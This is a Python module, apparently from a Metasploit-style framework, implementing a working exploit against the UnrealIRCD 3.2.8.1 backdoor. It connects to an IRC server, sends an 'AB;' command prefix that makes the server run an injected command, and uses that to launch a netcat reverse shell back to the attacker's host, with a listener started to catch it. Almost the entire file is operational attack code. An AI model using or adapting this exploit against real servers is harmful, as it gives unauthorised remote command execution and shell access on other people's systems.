from msf.lib.exploit import Exploit, Revshell
import socket
import time


class Unrealircd(Exploit):

    def __init__(self):
        super().__init__('UnrealIRCD', 'UnrealIRCD 3.2.8.1 exploit')

    def check(self, target, port=6667):
        super().check(target, port)
        print('Check not implemented for this exploit.')

    def exploit(self, target, port=6667, revshell_ip=None, revshell_port=None):
        payload = Revshell.build_generic_nc_payload(revshell_ip, revshell_port)
        conn = Exploit.init_tcp_conn(target, port)
        if not conn:
            return False
        # wait for connection to initialize
        time.sleep(3)
        banner = Exploit.get_banner(conn)
        # start revshell thread
        revshell = Revshell(revshell_ip, revshell_port)
        revshell.start()
        if Unrealircd.inject_payload(conn, payload):
            print('Exploit successful!')
            success = True
        else:
            print('ERROR: Did not gain shell. Exploit failed.')
            success = False
        # clean up
        print('Closing connections to server.')
        conn.close()
        print('Exploit complete.')
        if success:
            # we need to wait a while
            print('Sleeping for 30 seconds. In that time we should receive a reverse shell. If not, just wait longer!')
            time.sleep(30)
            return revshell
        revshell.terminate()
        return success

    @staticmethod
    def inject_payload(conn: socket.socket, payload) -> bool:
        """
        Inject a payload into the vulnerable connection.
        :param conn: socket object connected to vulnerable host
        :param payload: payload to inject (usually a reverse shell)
        :return: boolean indicating success or failure
        """
        # send a simple reverse shell from the exploited server to the attacking host
        print('Injecting and running payload.')
        sent_bytes = conn.send('AB; nohup {} >/dev/null 2>&1\n'.format(payload).encode())
        return True
